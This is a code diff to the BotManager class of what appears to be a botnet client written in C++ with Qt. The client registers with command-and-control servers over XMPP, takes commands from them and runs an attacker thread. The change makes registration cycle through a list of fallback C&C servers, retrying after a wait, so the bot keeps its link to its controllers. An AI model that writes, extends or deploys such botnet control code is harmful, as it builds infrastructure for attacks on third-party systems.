@@ -32,7 +32,6 @@
 #include "attackstartedresponse.h"
 #include "attackstoppedresponse.h"
 #include <QThread>
-#include <QTimer>
 #include <QNetworkInterface>
 #include <QNetworkAccessManager>
 #include <QNetworkRequest>
@@ -60,21 +59,41 @@ void BotManager::connectToCC()
 
 void BotManager::disconnectFromCC()
 {
-    _xmppClient -> disconnectFromServer();
+    if(_xmppClient -> isConnected())
+        writeEvent("Desconectado de CC");
 
-    writeEvent("Desconectado de CC");
+    _xmppClient -> disconnectFromServer();
 }
 
 void BotManager::registerOnCC()
 {
-    _xmppRegClient = new XmppRegClient(StorageManager::readConfig("server").toString());
+    static bool checked = false;
+    static QStringList servers;
 
-    connect(_xmppRegClient, SIGNAL(success(const QString&, const QString&, const QString&)),
-            this, SLOT(successOnXmppRegClient(const QString&, const QString&, const QString&)));
-    connect(_xmppRegClient, SIGNAL(failure(const QString&, const QString&, const QString&)),
-            this, SLOT(failureOnXmppRegClient(const QString&, const QString&, const QString&)));
+    if(!checked) {
+        servers = StorageManager::readServerList();
 
-    _xmppRegClient -> sendRegistrationRequest();
+        if(servers.isEmpty()) {
+            writeEvent(QString("Lista de servidores en %1 no encontrada").arg(SERVER_LIST_FILE));
+            emit serverListNotFound();
+
+            return;
+        }
+
+        checked = true;
+    }
+
+    static QListIterator<QString> it(servers);
+
+    if(!it.hasNext()) {
+        writeEvent(QString("Registro fallido en todos los servidores de %1. Proximo intento en %2 minutos").arg(SERVER_LIST_FILE).arg(MINUTES_OF_WAITING));
+
+        QThread::sleep(MINUTES_OF_WAITING * 60);
+
+        it.toFront();
+    }
+
+    _xmppRegClient -> sendRegistrationRequest(it.next());
 }
 
 void BotManager::readyOnXmppClient()
@@ -177,9 +196,9 @@ void BotManager::failureOnXmppRegClient(const QString& server, const QString& us
 {
     _xmppRegClient -> disconnectFromServer();
 
-    writeEvent(QString("Registro fallido en %1 para Usuario: %2 y Password: %3 (Proximo intento en %4 minutos)").arg(server).arg(username).arg(password).arg(MINUTES_OF_WAITING));
+    writeEvent(QString("Registro fallido en %1 para Usuario: %2 y Password: %3").arg(server).arg(username).arg(password));
 
-    QTimer::singleShot(MINUTES_OF_WAITING * 60 * 1000, this, SLOT(registerOnCC()));
+    registerOnCC();
 }
 
 BotManager::BotManager()
@@ -187,7 +206,7 @@ BotManager::BotManager()
     _xmppClient = new XmppClient(APPLICATION_NAME);
     _xmppClient -> setParent(this);
 
-    _xmppRegClient = 0;
+    _xmppRegClient = new XmppRegClient(this);
 
     _bot = new Bot;
 
@@ -214,11 +233,6 @@ BotManager::~BotManager()
     _attackerThread -> wait();
 
     delete _attackerThread;
-
-    if(_xmppRegClient)
-        delete _xmppRegClient;
-
-    delete _xmppClient;
     delete _bot;
 }
 
@@ -228,6 +242,10 @@ void BotManager::createConnections()
             this, SLOT(readyOnXmppClient()));
     connect(_xmppClient, SIGNAL(commandReceived(Message *)),
             this, SLOT(commandReceivedOnBot(Message *)));
+    connect(_xmppRegClient, SIGNAL(success(const QString&, const QString&, const QString&)),
+            this, SLOT(successOnXmppRegClient(const QString&, const QString&, const QString&)));
+    connect(_xmppRegClient, SIGNAL(failure(const QString&, const QString&, const QString&)),
+            this, SLOT(failureOnXmppRegClient(const QString&, const QString&, const QString&)));
     connect(_attackerThread, SIGNAL(started()),
             _attacker, SLOT(attack()));
     connect(_attacker, SIGNAL(done()),
